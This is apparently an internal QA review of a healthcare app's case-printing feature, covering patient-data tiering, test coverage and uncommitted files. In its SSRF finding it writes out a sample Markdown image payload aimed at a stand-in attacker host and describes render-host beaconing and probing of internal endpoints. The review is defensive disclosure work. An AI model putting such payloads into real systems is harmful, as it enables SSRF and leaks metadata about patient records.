# PDF·P3 (Printing Cases) — QA review

> ## ⛔ PASS 1 OF 2 — STATIC REVIEW ONLY. **NO VERDICT IS ISSUED IN THIS PASS.**
>
> A full `e2e:prod` gate run was executing on the shared local stack for the whole
> duration of this review. Per the lead's standing instruction the reviewer touched
> **no database, no test runner, no build**: this document is the product of static
> file reading, `git` and `grep` only.
>
> **What that means for how this document may be cited.** Everything below about
> TypeScript, about the *text* of a migration, and about what a document *renders* is
> a first-class finding. Everything below about what a **gate**, a **policy**, a
> **`prosecdef` boolean** or an **ACL** actually IS in the live catalog is **unverified**
> — migration text is stale by design in this repo (CLAUDE.md's binding graphify
> exception), and these seven migrations rewrite function bodies at runtime via
> `pg_get_functiondef()` + `replace()` + `execute`. ⛔ **Do not quote any statement in
> this pass as catalog evidence.** § 7 is the list of things pass 2 must measure.
>
> `APPROVED` / `CHANGES REQUESTED` is deferred to **pass 2**, against a settled DB.

**Phase:** PDF·P3 — Printing Cases (ADR 0104 P3)
**Contract:** ADR [0144](../decisions/0144-case-printing-dossier-lock-and-phi-fork.md)
**as amended (Amendments 1–4)** · plan [case-printing-p3.md](../plans/case-printing-p3.md) ·
substrate [case-printing-p3-substrate.md](../plans/case-printing-p3-substrate.md)
**Prior art in force:** ADR 0104 (A7 · A8 · D9 · D14 · D15) · 0125 (D5 fourth cell, D8) ·
0126 (D7, D9) · 0079 (door audit) · Architecture Rules 1 · 7 · 9 · 10 · 11 · 12
**Reviewed at:** `615afaf0` + working tree (see **H-1** — a material part of the phase is
not in any commit)
**Reviewer:** `qa` · **Date:** 2026-08-25

---

## 1. Summary of pass 1

The build is of unusually high quality. The PHI fork is implemented at **one** place
(`resolvePatients`), the variant is derived from the **answer** rather than the request at
every one of the four sites that could have re-derived it, the two D3 arms are written out
separately as ADR 0125 D8 requires, the download gate's `template_key`-not-`sensitivity_tier`
reasoning is **correct** and I could not construct a counter-example, and the Rule 7 sanitize
repoint is a genuine byte-equivalence, not an assertion.

Pass 1 nonetheless produced **three substantive findings**: a Rule 12 / LGPD Art. 18 hole of
exactly the class ADR 0144 Amendment 2 pt 4 exists to close; a new server-side network surface
the phase opened without noticing; and **three of D14's own test-floor items not delivered**,
one of which ADR 0144 D9 states *is* delivered. Plus a hygiene finding that affects what "this
phase shipped" even means.

⭐ **The pattern across C-1, C-3 and M-1 is one pattern, and it is worth naming.** This phase's
documentation is exceptionally strong — and in all three cases the *documentation* is what a
reader would check, and it is the thing that is wrong. A comment states a `containsPhi` formula
the code does not use (M-1). A section header and a fixture row describe a persona no assertion
uses (C-3a). An ADR states that both halves of its most security-relevant decision are pinned,
and one is pinned nowhere (C-3c). The prose is the artifact everyone trusts here, so when it
drifts, nothing contradicts it.

| # | Severity | Title | Locus |
| --- | --- | --- | --- |
| **C-1** | 🔴 **blocking (candidate)** | `containsPhi`'s free-text term set is narrower than what the dossier renders — and narrower than what `dispose_case_phi` itself redacts. A dossier carrying a patient name in its **title** can land standard-tier and survive an Art. 18 erasure. | `src/lib/cases/pdf-payload.ts:435-442` |
| **C-2** | 🟠 **blocking (candidate)** | P3 is the first path that turns author-controlled Markdown into **live HTML inside Gotenberg**. `<img src="http…">` survives the sanitize schema, so a narrative author can make the render host issue arbitrary outbound GETs. The Gotenberg module still claims the HTML "fetches nothing". | `src/lib/markdown/sanitize-schema.ts:38` · `src/lib/pdf/markdown.ts` · `src/lib/pdf-mint/gotenberg.ts:1-6` |
| **C-3** | 🔴 **blocking (candidate)** | **Three of D14's named test-floor items are not delivered, and one of them is claimed as delivered by ADR 0144 D9 itself.** The phase-only-respondent A7 arm is absent (its persona is fetched and never used), the recused-member **download** arm is absent, and the identified prévia's **PHI-read row** is pinned nowhere — not pgTAP, not E2E — while D9 says *"Both halves are pgTAP-pinned"*. | `supabase/tests/368_…sql:39, 270` · `e2e/pdf-printing-cases.spec.ts` |
| **M-1** | 🟡 moderate | The disposal migration states a `containsPhi` formula the provider does not implement (`… \|\| includePhi`). Two authorities for one rule, disagreeing. | `supabase/migrations/20261003002600_…sql:204-206` |
| **M-2** | 🟡 moderate | A **passing** E2E test is named for, and documented as, a **live defect** that this phase fixed. A green suite reports "the platform is broken". | `e2e/pdf-printing-cases.spec.ts:1134-1181` |
| **M-3** | 🟡 moderate | pgTAP `368`'s "a PHI mint emits **both** rows" pairing is **not causal**: the `case_patient.read` row it finds was written by an unrelated earlier call in the same transaction, not by the mint under test. | `supabase/tests/368_…sql:367-374` |
| **H-1** | 🟡 hygiene | ADR 0144, both plan documents, the phase's progress detail file and the **entire 59 KB E2E spec** are **untracked** — in no commit. Three further E2E specs and six tracker documents are modified and uncommitted. | working tree |
| **N-1** | ⚪ note | Non-unique DOM ids in `PreviaLink` (`"previa-helper"`, `"previa-phi-helper"`). Not currently reachable — one panel per page today. | `src/components/printing/previa-link.tsx:71-72` |
| **N-2** | ⚪ note | `src/app/api/previa/…/route.ts:183` calls `supabase.rpc` inline. Covered by ARCHITECTURE.md's named precedent for the sibling `/api/documents/[id]` route, but this route does not restate the exception for itself. | as cited |

**What came back CLEAN** (stated so the negative result is citable): Rule 10 across every
new pt-BR string and every rendered-PDF string · zero `any` in any form across 33 changed
non-test files · zero newly-added `"use client"` · no raw Postgres/Supabase error reaching
the UI on any changed path · no client value-import from a server query module · no
duplicated label map (all three `src/components/cases/*` files are genuine re-exports) · no
vacuous assertion found in any of the ten changed/added unit-test files, including no
sibling of the `pdf-payload.test.ts` "mocks the module the defect lives in" pattern.

---

## 2. Finding C-1 — the Art. 18 hole the Amendment 2 argument stopped one step short of

### The code

`src/lib/cases/pdf-payload.ts:435-442`:

```ts
const hasMaskedFreeText =
  narratives.some((n) => n.bodyMd !== null) ||
  interviewEntries.some((i) => i.summaryMd !== null) ||
  timeline.some((e) => e.body !== null) ||
  meetingEntries.some((m) => m.summary !== null || m.decision !== null) ||
  referrals.some((r) => r.replyBody !== null || r.snapshot.length > 0) ||
  phases.some((p) => p.items.length > 0)
const containsPhi = hasMaskedFreeText || renderedPatientField
```

### The gap

The renderer prints **more** author-written free text than that disjunction tests. Three of
the omissions are not a judgement call, because **`dispose_case_phi` itself redacts them** —
i.e. the platform's own PHI classifier already states that these fields carry masked-class
content (ADR 0144 § "Correction to D3's rationale", and repeated verbatim in this phase's own
`src/lib/pdf/documents/print-source.ts:79-90`):

| Rendered at | Source column | Redacted by `dispose_case_phi`? | In `hasMaskedFreeText`? |
| --- | --- | --- | --- |
| `src/lib/pdf/documents/case.ts:547` (`body.title`, the `<h1>`) | `cases.label` | ✅ redacts | ⛔ **no** |
| `src/lib/pdf/documents/case.ts:349` (timeline `esc(e.title)`) | `case_events.title` | ✅ redacts | ⛔ **no** — only `.body` is tested |
| `src/lib/pdf/documents/case.ts:431` (manifest `esc(d.title)`) | `documents.title` | ✅ redacts | ⛔ **no** |

(Three further rendered free-text fields are omitted and are *not* on the disposal door's
list, so they are a weaker case but the same shape: `correctionEntries.justification` at
`case.ts:408`, `actionItems.title` at `case.ts:389`, `referrals.question` at `case.ts:329`.
`interviewsSection` also prints subject/interviewer names at `case.ts:299`, which for an
externally-named subject is a free-text person name.)

### The consequence chain, end to end

1. Provider derives `containsPhi = false`.
2. `src/lib/pdf-mint/actions.ts:333` → `printedRenditionStorageBucket(false)` → `documents-standard`.
3. `mint_printed_document` derives the file tier as `case when contains_phi then 'phi' else 'standard' end` (stated at `20261003002600_…sql:190-191`) → `sensitivity_tier = 'standard'`.
4. `dispose_case_phi` block (f) filters `f.sensitivity_tier = 'phi'` (`20261003002600_…sql:166`) → **skips the object**.
5. Block (f2) revokes only `where … and contains_phi` (`…sql:234`) → **the registry row is not even revoked**.
6. ⇒ A PDF whose `<h1>` reads *"Dossiê — Caso 0042 — Queda da paciente Maria Silva, leito 302"* survives the Art. 18 erasure in Storage, still `active`, still downloadable, and never carried the `CONTÉM DADOS DE PACIENTE` band on its pages.

This is precisely the failure mode ADR 0144 **Amendment 2 pt 4** was written to close
(*"⛔ Without the second clause … Patient data would survive an Art. 18 erasure in Storage"*).
Amendment 2 closed it for `patient_identifiers`-sourced fields. It did not close it for the
three fields the disposal door itself redacts.

### Reachability — this is not a theoretical edge

Every `hasMaskedFreeText` disjunct must be false and `renderedPatientField` must be false.
The natural instance is a **`cancelled`** case: ADR 0144 D3 registers `cancelled`
deliberately (*"terminal-forever … the stronger of the two terminal states"*), and a case
cancelled early is exactly the case with a label, some event titles, an uploaded document or
two, and **no** narrative body, **no** interview summary, **no** submitted phase answers and
**no** meeting notes. `renderedPatientField` is false whenever `get_case_patients` answers
`null` (a content-reader without `read_standard_phi`) **or** `[]` (entitled, no patient on
file) — both of which the de-identified path handles by rendering with no demographics.

### Requirement violated

ADR 0144 **D6** — *"`contains_phi` derives automatically from the **presence** of
masked-class free-text content"*. The implemented predicate tests a hand-listed **subset** of
the masked-class free text the same dossier renders. ADR 0144 **D10** and Architecture
**Rule 12** are the downstream casualties.

### What I am *not* asserting

I am not asserting that `cases.label` **is** PHI in the abstract. I am asserting that the
platform's own disposal door treats it as masked-class, that the dossier prints it, and that
the two statements cannot both be true while `containsPhi` ignores it. Whichever way that is
resolved — widen the derivation, or narrow the disposal door — **the two must agree**, and
today they do not.

### Requires catalog confirmation in pass 2

That `dispose_case_phi` does in fact redact `cases.label`, `case_events.title` and
`documents.title`. Two independent in-repo statements say so (ADR 0144's catalog-verification
section; `print-source.ts:79-90`), one of them recorded as catalog-verified — but **this pass
did not read `pg_get_functiondef`** and per this repo's own rule that is the only admissible
evidence. If any of the three is *not* redacted, drop that row; **C-1 survives on any one of
them.**

---

## 3. Finding C-2 — P3 opens a server-side fetch surface, and the module that would have caught it still says otherwise

### What changed

Before this phase, the print templates passed author Markdown through `esc()`. `esc()` was
cosmetically wrong (it printed literal `##` on an accreditation record) and the phase fixed it
correctly — `src/lib/pdf/markdown.ts` parses the Markdown and sanitizes the **tree**, using the
screen's own schema. The reasoning in that module about *stored XSS reaching Gotenberg* is
right and the fix is the right one.

**But the threat model moved and the schema did not.** `MARKDOWN_SANITIZE_SCHEMA`
(`src/lib/markdown/sanitize-schema.ts:34-41`) is `rehype-sanitize`'s `defaultSchema` with the
protocols tightened. `defaultSchema` **allows `<img>` with `src`**, and the tightening keeps
`src: ['http', 'https']`. So `![](https://attacker.example/beacon?c=…)` written into any
narrative, interview summary, meeting note, referral reply or frozen snapshot survives
sanitization and is handed to Gotenberg as a live `<img>`.

`src/lib/pdf/documents/case.ts:157` (`prose()`) is the only consumer; `renderMarkdown` appears
nowhere else in `src/` outside its own module and tests, so **P3 is the first and only path
that puts author-controlled live HTML inside the render container.**

### Why that is not the same risk as on screen

On screen the fetch is the *reader's* browser — an ordinary, accepted web behaviour, and the
reason the schema permits `img` at all. In the print path the fetch is issued by a **headless
Chromium sitting on the server network**. That is a different primitive:

1. **SSRF.** An author with narrative-write access on one case can cause the render host to
   GET arbitrary http(s) URLs, including addresses only reachable from inside the container
   network (`http://localhost:…`, other internal services, cloud metadata endpoints). The
   response body does not return to the attacker, but reachability and timing do.
2. **Exfiltration beacon on a Rule 12 document.** An external host is pinged **every time
   that dossier is rendered** — every prévia, every mint — disclosing that this specific case's
   dossier was printed, when, and from what egress IP. That is confidentiality metadata about
   a PHI record leaving the network, on a surface with no audit row for it.
3. **Availability.** A hung external image consumes the 30 s render budget
   (`gotenberg.ts:9`) behind a bounded semaphore, so a handful of poisoned narratives can
   starve emission.
4. **Byte determinism.** A remote image makes the rendered bytes depend on a third party, so
   `content_hash` — the thing `/verificar` attests to — is no longer reproducible from the
   source. This is the same property `template-fingerprints.ts` exists to protect, arriving
   from the content side.

### The stale claim that would have caught it

`src/lib/pdf-mint/gotenberg.ts:1-6`:

> *"the HTML we send is fully self-contained (fonts, QR, CSS all inline), so the renderer
> stays generic and **fetches nothing**."*

That sentence was true for P1 and P2. **P3 falsified it and did not update it.** It is the
one place in the codebase that states the invariant this finding breaks.

### The reason the phase's own framing made it hard to see

`sanitize-schema.ts:22-29` argues — correctly, for XSS — that *"paper stricter than screen is
merely cosmetic; paper looser than screen is a security defect"*, and concludes *"the print
side must never define its own schema, not even temporarily"*. For **`<img src>` the correct
direction is paper stricter than screen**, and the module's own guidance discourages exactly
that. The "one policy, two consumers" consolidation is right for tags and protocols and wrong
for external subresources, because the two consumers have different network positions.

### Suggested shape of the fix (non-binding — `qa` does not fix)

Strip `img` (and any other external-subresource element) for the **print** consumer only, at
`src/lib/pdf/markdown.ts`, by narrowing the shared schema rather than replacing it —
e.g. `tagNames: MARKDOWN_SANITIZE_SCHEMA.tagNames.filter(t => t !== 'img')` — so the print
policy remains provably a **subset** of the screen policy, which is what the asymmetry
argument actually asks for. Whatever the fix, `gotenberg.ts`'s "fetches nothing" sentence must
end up either true again or deleted.

### Could not verify in this pass

Whether the Gotenberg container has outbound internet egress in dev, in the Coolify
deployment, or both. **If it has none, (2) degrades to internal-only and (1) is unaffected** —
the finding does not disappear either way, but its severity does move. See § 7.

---

## 3b. Finding C-3 — three D14 floor items are not delivered, and D9 states one of them is

ADR 0144 **D14** is the phase's Acceptance contract for tests. Read as a checklist against
`supabase/tests/368_printed_documents_cases.sql` and `e2e/pdf-printing-cases.spec.ts`:

| D14 floor item | Status |
| --- | --- |
| both directions on the PHI door | ✅ t36 / t37 (`:351-354`) — download side, paired, genuine |
| a PHI mint emits **both** rows | ⚠ present but **non-causal** — see **M-3** |
| an identified **prévia** emits the PHI-read row and **no** mint row | ⛔ **HALF ABSENT** |
| a disposed case drops registration and refuses the identified variant | ✅ t11 (`:206`) + t46 (`:414`) |
| SQL↔TS vector parity | ✅ structural — one shared fixture drives `344` (plan 68→110, 20→34 vectors) and the TS suite |
| the full-content predicate proven **not fail-open standalone** | ✅ t20–t24 (`:258-267`), with the positive twin |
| the A7 arm on a **recused member** and on a **phase-only respondent**, for **mint and download** | ⛔ **1 of 4 cells delivered** |

### C-3a — the phase-only-respondent arm does not exist

`supabase/tests/368_…sql:39` pulls the persona into the fixture:

```sql
(v->>'st_x2')::uuid  as st_x2,
```

`st_x2` appears **exactly once in the file** — that line. It is never referenced in any
assertion. Meanwhile `368`'s own § 6 header at `:270` reads *"recused member + phase-only
respondent, MINT and DOWNLOAD"*.

This is the strongest shape of the gap this review exists to find: the section header, the
fixture row and the plan count all read as coverage, and the assertion was never written. A
green `368` reports the D14 floor as met.

⚠ Note additionally that `st_x2` is used **elsewhere in the suite** (`00_setup.sql`,
`113_case_action_items.sql`) as a generic *"plain member, no attribution or grant"* persona —
not as a phase-bound respondent. So even the identity earmarked for this arm may not be the
one D8 describes (*"a respondent linked to a single phase"*). Whoever closes this must
construct the persona, not just reference the id.

### C-3b — the recused member is tested on mint only, never on download

Recused-member coverage is t25–t28 (`:275-286`): `can_read_case` false, `can_view_printed_document`
false, a positive twin, and the **mint** refusal. § 8's download tests (t36–t38) use `st_y` —
the *PHI-door-absent* persona — not `st_x`. D8 and D14 both say **mint AND download**, and A7's
whole point is that arm-parity across the two is not automatic. The download side is a
*different* door (`open_printed_document` → `app.resolve_document_version_bytes`), which is
precisely why the ADR demands both.

### C-3c — the identified prévia's PHI-read row is pinned nowhere, and D9 says it is

ADR 0144 **D9**, on the decision the ADR itself calls *"the most security-relevant decision in
the phase"*:

> *"It emits the **Rule 11 PHI-read row** via the domain's audited reader, and emits **no
> `document.minted` row** … **Both halves are pgTAP-pinned: read row present, mint row absent.**"*

Measured:

- **mint-row-absent** — ✅ pinned twice: `368` t43 (`:396-399`) and
  `e2e/pdf-printing-cases.spec.ts:669`.
- **read-row-present** — ⛔ **pinned nowhere.**
  - Not in pgTAP, and it *cannot* be: neither `log_document_previa` nor `mint_printed_document`
    calls `public.get_case_patients`. The PHI read happens in the TS provider
    (`src/lib/cases/pdf-payload.ts:189`), outside both RPCs. `…002500_…sql:538-547` states this
    dependency itself.
  - Not in E2E: the spec queries the audit log four times (`:617`, `:669`, `:726`, and the
    `document.previa_printed` assertions around them) and **never once for `case_patient.read`**.
    `grep 'case_patient.read'` over the spec returns zero assertion sites.

So the one half that D9 exists to guarantee — *reasoning "prévias are ephemeral, so they don't
audit" turns the prévia into an **unaudited PHI export path** that bypasses the registry
entirely* — is the half with no test. The behaviour is very probably correct (it falls out of
`get_case_patients` being the only door), but **"probably correct by construction" is what D9
explicitly refused to accept**, and the ADR now carries a false statement about its own
coverage. The assertion has to live in E2E, since the pgTAP layer structurally cannot reach it.

### Requirement violated

ADR 0144 **D14** (test floor, three items) and **D9** (its stated pinning). Under CLAUDE.md § 6
this is a step-1/step-2 gap surfacing at step 3, and per the QA posture a single unmet
Acceptance bullet is `CHANGES REQUESTED` regardless of the rest.

---

## 4. Finding M-1 — the disposal migration cites a formula the provider does not implement

`supabase/migrations/20261003002600_dispose_case_phi_printed_documents.sql:204-206`:

> *"⚠ The provider guarantees the sets line up: `buildCasePayload` derives
> `containsPhi = <masked-class free-text presence> || includePhi`, so an IDENTIFIED mint is
> phi-tier by construction even on a case with no free text at all."*

The provider derives `containsPhi = hasMaskedFreeText || renderedPatientField`
(`src/lib/cases/pdf-payload.ts:442`), and its own comment four lines above says the opposite of
the migration's: *"⚠ `includePhi` is deliberately NOT a term."*

The migration's **conclusion** happens to survive — `renderedPatientField` subsumes
`includePhi` because the identified path throws on both `null` and `[]`, so an identified mint
always renders at least one patient row. But the two documents now describe one rule two ways,
and the migration's version is the one a reader arrives at while reasoning about erasure. It is
also, concretely, the paragraph where **C-1 was reasoned past**: the whole argument is about
the *identified* variant and never asks whether a de-identified mint of a thin case lands
standard-tier. It does.

The comment ends *"Pinned by a keystone, not by this comment."* Pass 2 should confirm which
formula that keystone actually pins — see § 7.

*(There is a genuine residual edge under the migration's own reasoning: a
`patient_identifiers` row whose eight rendered fields are all NULL yields
`variant: 'identified'` with `renderedPatientField = false`. On a thin case that mints a
`case_identified` document at standard tier. No identifier is disclosed in that state, so it is
not a leak — but it is a `case_identified` row block (f2) will not revoke.)*

---

## 4b. Finding M-3 — "a PHI mint emits both rows" is proven by coincidence, not by causation

`supabase/tests/368_printed_documents_cases.sql:367-374` pairs t39 (a `document.minted` row
exists for `doc_ident`) with t40 (a `case_patient.read` row exists for `case_t`) and presents
the pair as D14's *"a PHI mint emits **both** rows"*.

`mint_printed_document` never calls `public.get_case_patients` — the identified fields are
assembled in the TS payload builder, outside the RPC. The `case_patient.read` row t40 finds was
written by **t18** (`:242-243`), an unrelated earlier call in the same transaction. The two
assertions therefore prove that two independently-true facts coexist in one transaction; they
do not prove that the mint under test emitted anything.

This is the *"a green gate can mean the fixture cannot reach the failing state"* shape: remove
the mint entirely and t40 still passes. The fix is either a causal control (assert the read-row
count **moves** across the mint) or an honest retitle acknowledging that the causal half lives
in E2E — the same correction `pdf-payload.test.ts` already received this phase when it was
retitled *"provider half only"*.

---

## 5. Finding M-2 — a passing test named for a live defect

`e2e/pdf-printing-cases.spec.ts:1134`:

```
test('BUG-P3-PHI-REFUSAL-MESSAGE: an UNENTITLED caller is told the case has no patient
      data, instead of that they lack authorisation', …)
```

with a docstring reading *"⛔ EXPECTED RED until the defect is fixed"* and describing
`getCasePatients` as still collapsing `null` into `[]` with signature
`Promise<CasePatient[]>`.

**The defect was fixed inside this phase** (`0c472b54`): `src/lib/queries/cases.ts:2096-2106`
now returns `CasePatient[] | null` and the assertion at line 1177 asserts the **correct**
behaviour (`'Sem autorização para emitir a versão identificada deste caso.'`). So the test is a
valid regression guard that passes — under a name and a docstring that both state the platform
is broken, and under a comment block explaining why it is placed last "so a red here does not
abort the corridors above", which is now moot.

This matters beyond tidiness. The substrate brief's own § *"REPORT THE ERROR, NEVER THE TEST
NAME"* is about test names being read as claims. Here the name is an **inverted** claim, in a
green run, on the phase's most security-relevant behaviour. Anyone reading a gate summary sees
a passing assertion that the platform tells unentitled callers a case is empty.

⚠ Specs are `tester`-owned; this loops back through the lead, not through the engineers.

---

## 6. Finding H-1 — a material part of the phase is in no commit

`git status --porcelain` at review time:

```
?? docs/decisions/0144-case-printing-dossier-lock-and-phi-fork.md
?? docs/plans/case-printing-p3.md
?? docs/plans/case-printing-p3-substrate.md
?? docs/progress/pdf-p3.md
?? e2e/pdf-printing-cases.spec.ts                    (58,935 bytes)
 M PROGRESS.md · docs/decisions/0104-…md · docs/decisions/INDEX.md
 M docs/progress/2026-Q3.md · bug-log-archive.md · follow-ups.md
 M e2e/case-patient.spec.ts · e2e/cases-extras.spec.ts · e2e/phase-f2-attachments.spec.ts
```

Consequences, stated concretely:

1. **The phase's governing ADR is untracked.** The ten commits `docs/progress/pdf-p3.md`
   lists contain the code but not the decision record it implements, nor the substrate brief
   every other document instructs the reader to read first.
2. **The entire E2E surface is untracked**, including the seven locator fixes PROGRESS.md
   credits with being "verified at gate scale". Gate 2's evidence rests on a 59 KB file one
   `git clean` from non-existence.
3. `docs/progress/pdf-p3.md` says *"⛔ NOT pushed"* — accurate but incomplete in a way that
   reads as reassuring. **Not pushed** and **not committed** are different states, and only
   the first is recorded.
4. `docs/decisions/INDEX.md` is regenerated but uncommitted, so `lint:adr-index` is green
   against a working tree that a checkout would not reproduce.

Not a correctness defect. It **is** a statement about what "PDF·P3 is built" currently means,
and it should be resolved before pass 2 so that pass 2 reviews a committed tree.

---

## 7. ⭐ Could not verify in pass 1 — this is a work list, not a footnote

Ordered by what pass 2 needs first. Items 1–6 need the catalog; 7–9 need something else.

1. **Every `prosecdef` / ACL claim in § 2–4.** Nothing in this document about a gate's live
   body is evidence. Pass 2 must reconcile the phase's candidate list of **27 gates (17 brand
   new)** against `pg_proc` **in both directions** — in-the-list-absent-from-catalog, and the
   worse one, in-the-catalog-absent-from-the-list (a gate created by one of the diff's 49
   runtime-rewrite `execute`/`format` lines). The substrate brief demands the reconciliation
   be **reported before the verdicts**; this pass could not begin it.
2. **`dispose_case_phi` redacts `cases.label` / `case_events.title` / `documents.title`** —
   C-1's premise. Read `pg_get_functiondef`, not the ADR and not `print-source.ts`.
3. **`app.can_read_full_case_content` is fail-closed on an empty case.** ✅ *in text* — the
   capability gate at `…002300_…sql:87-92` returns FALSE before any of the six per-axis
   `not exists` blocks (which ARE individually vacuous-true on zero rows, exactly as the file's
   header states) is reached; null/unknown-case guards at `:74-80`; both `COMMENT ON FUNCTION`s
   present (`:182-193` new, `:203-211` the meeting twin's long-owed debt, paid). ⛔ **The live
   body is still unverified** — read `pg_get_functiondef` and re-run the standalone
   fail-direction check there.
4. **The mint door's kind-conditional sites are still exactly three** (A8). ✅ *in text* —
   site 1 `:168/172/182`, site 2 `:205/208/210`, site 3 `:135` + `:159-164`; the ten other
   `p_source_kind` references are kind-agnostic dispatch, and `log_document_previa`'s own
   kind-branch is correctly outside the trio's scope. ⛔ Must be re-counted in the live
   `prosrc`, with `--` comments stripped and **no line filtering** (a line-filtered `prosrc`
   drops multi-line disjuncts).
5. **The two DROP+CREATEs** (`app.resolve_print_source_state` dropped `…002400_…sql:70`,
   `public.print_source_state` dropped `:707`). ✅ *in text* — both revokes present (`:176`,
   `:757`) and the `public.*` door's `grant execute … to authenticated, service_role` at
   `:758-759`; the three new `app.*` helpers closed in `002700:60-62`; the 12 D15 trigger
   functions closed in `002800:49-60` (a forward-only correction, not an edit to `002700`).
   ⛔ **A NULL `proacl` is EXECUTE TO PUBLIC and only the catalog can say what landed.** Confirm
   `proacl` for all 17 named functions, and confirm `320`'s PUBLIC-executable ratchet is back
   at exactly **237** — that number is the whole reason `002800` exists.
6. **`app.can_view_printed_document('form_response', …)` vs the `responses`/`answers` read
   policies.** `buildResponseSections` (`src/lib/forms/pdf-payload.ts:249`) now renders a
   phase's answers inside the dossier **without** the per-response `getResponsePrintContext`
   gate the standalone form print applies — the dossier's own arm plus per-response RLS is the
   whole boundary. If the print door is **narrower** than the answer read policies, the dossier
   widens print reach for individual responses. If they coincide (as the prévia route's comment
   asserts), this is clean. **This one is a genuine open question, not a formality.**
7. **Gotenberg egress** (C-2 severity): does the render container have outbound internet in
   dev and in the Coolify deployment? Infrastructure, not catalog.
8. **What keystone pins the `containsPhi` formula** that `…002600_…sql:206` claims is pinned
   (M-1), and whether it pins the built formula or the cited one.
9. **`app.is_staff_admin_of` fails closed on a null `auth.uid()`.** `dispose_case_phi`'s
   guarantee that `revoked_by` is never null — and hence that block (f2) satisfies the
   `pd_revocation_complete` CHECK rather than raising mid-erasure — rests entirely on this, and
   it is asserted in a comment (`…002600_…sql:216-219`) rather than proven in the migration.
   The function is outside this diff, so only the catalog answers it.
10. **`information_schema.role_table_grants` for `case_print_revisions` is genuinely empty for
   `anon`/`authenticated`** (Amendment 4's load-bearing revoke; `368` t5 is designed to check
   it). ✅ the `revoke all` is present at `…002200_…sql:69`, RLS is on at `:63`, and no
   `create policy` touches the table anywhere in the seven migrations — but Supabase default
   privileges GRANT `authenticated` ALL on new `public` tables, so only the catalog closes this.
11. **The pgTAP `368` mutation audit.** The phase reports every absence assertion
   mutation-proven RED first, which is the right control; pass 2 should read the four
   neutralization records rather than accept the summary — and specifically check that each
   mutation **landed** (a mutation that did not fully apply reports GREEN). ⛔ The substrate
   brief's own warning applies with force here: **a mutation audit is not an arm.** Four greens
   there say nothing about `ARM=census` / `hat` / `floor` / `wrapper`, and with **17 of 27 gates
   brand new** this phase is close to the worst case `ARM=census` was written for.

---

## 8. What pass 1 verified positively

Recorded so pass 2 does not re-derive it.

**The D5 fork is single-point and structural.** `resolvePatients`
(`src/lib/cases/pdf-payload.ts:175-229`) is the only reader of `get_case_patients` in the
dossier path, and the de-identified branch sets `name`, `mrn`, `dateOfBirthDisplay`,
`attending`, `encounterRef` to `null` explicitly (lines 222-226) rather than omitting them. The
template renders what it is given (`case.ts:182-201`), so a template edit **cannot** widen the
disclosure. `patient_key` / `encounter_key` are absent from the `CasePatient` type altogether,
so D5's "neither variant" guarantee is enforced by the compiler, not by discipline.

**The variant reaches the door from the render, not from the request** — at all four sites
that could have got it wrong: `templateFor(payload.body)` in `actions.ts:315`, the same in the
prévia route at `route.ts:153`, `sourceRevision` read from the payload at `actions.ts:307`, and
`variant` assigned from `get_case_patients`' actual answer at `pdf-payload.ts:194/214`. ADR 0144
Amendment 1's rejected `templateKeyFor({includePhi})` shape appears nowhere.

**The download gate's discriminator is correct, and the reasoning holds.** I tried to break
`template_key`-not-`sensitivity_tier` and could not: D6 makes `contains_phi` true for both
variants, so a tier-keyed gate refuses the de-identified dossier to exactly the readers D5
built it for. The two case-print gates using **different** discriminators — destruction on the
tier (what could be inside), download on the variant (what this reader may see) — is right, and
both migrations say so in the same words, which is the correct place for that argument.
*Live-body confirmation is § 7 item 1.*

**D3's two arms are declared separately and move in tandem.**
`src/lib/pdf/documents/print-source.ts:147-172` and `:227-249` spell out the identical
two-conjunct predicate twice, including the disposal term, with the fourth-cell rationale
written at the second site. The `cancelled`-registers divergence from the meeting arm is
deliberate and argued. The case-detail page derives **both** axes from **one** state object
(`…/(detail)/page.tsx`), which makes a divergent-argument fourth cell unconstructible there.

**Rule 7 equivalence holds.** The extracted `MARKDOWN_SANITIZE_SCHEMA` is byte-identical in
construction to the literal removed from `markdown-renderer.tsx` (same `defaultSchema` spread,
same two protocol overrides — verified by reading the diff, not the test). Neither consumer
enables raw HTML: the screen has no `rehype-raw`, the print chain does not set
`allowDangerousHtml`. `sanitize-equivalence.test.ts` carries an explicit "this comparison can
actually FAIL" control. **The XSS half of Rule 7 is sound** — C-2 is a different property.

**No PHI is read outside the audited door, and the provider grants nothing.**
`buildCasePayload` contains no `createAdminClient()`; every leg reads through
`src/lib/queries/` under the caller's session. `getCasePatients` is the only
`patient_identifiers` reader, its three-answer contract is now honest
(`src/lib/queries/cases.ts:2096-2106`), and the sole consumer is the payload builder — so the
signature change to `| null` has no other call site to regress.

**D9's prévia asymmetry is correctly ordered.** `route.ts` runs build → render → **log** →
stream, so an unentitled identified prévia dies in the provider before any audit row or byte
exists, and `log_document_previa`'s body **names that dependency in a comment at the door**
(`…002500_…sql:531-547`) — the right response to a cross-layer invariant a DB function cannot
see. `?phi=1` is the single recognised spelling and everything else is de-identified.

**The mint affordance gate re-derives nothing.** The card renders on a non-null
`getCasePrintContext`, which is the DEFINER door's own answer; the page carries an explicit
prohibition on restoring a `?? true` fallback. `getCasePrintContext`
(`src/lib/queries/printed-documents.ts:472-509`) refuses on a missing or mistyped field rather
than coalescing — the note about `.maybeSingle<T>()` being an assertion and not a verification
is correct and load-bearing.

**The migration text is internally consistent with the ADR on every clause I checked, C-1
and M-1 aside.** D3's two arms live in two different functions with the disposal conjunct in
both (`…002400_…sql:274-276` and `:355-359`), and `app.case_is_terminal` deliberately omits the
disposal conjunct because it answers a different question (bump eligibility, not registration)
— that is a correct non-factoring, not a leak. Amendment 4's substrate is complete: table shape,
RLS on, zero policies, the load-bearing `revoke all`, and the `printed_rendition` exclusion in
`app.trg_bump_case_revision_documents` (`…002200_…sql:264-266`) that stops every case mint from
landing NOT-CURRENT the instant it succeeds. D8's predicate carries all **seven** measured axes
(A `:87-92`, B `:94-100`, C `:102-124`, D `:126-133`, E `:135-156`, F `:158-165`, G `:167-176`)
— none missing. D10 reuses the two-phase idiom with no direct delete, populates all the columns
`pd_revocation_complete` requires in one statement, satisfies `pd_revoked_iff_ts`, and leaves
`content_hash` / verification token / `document_version_id` / `audit_log` untouched, so registry
survival is by omission rather than by a clause that could be edited away. No top-level
`set local` in any of the seven files.

**Test hygiene.** A dedicated vacuity sweep over all ten changed/added unit-test files found
no sibling of the `pdf-payload.test.ts` pattern: every other `vi.mock()` targets a dependency
*below* the subject; every "does not contain PHI" assertion is paired with a positive control
proving the fixture rendered; `print-source-vectors.test.ts` uses strict equality so a missing
vector reds rather than passes; no test targets a removed subject.

---

## 9. Known items deliberately NOT re-filed

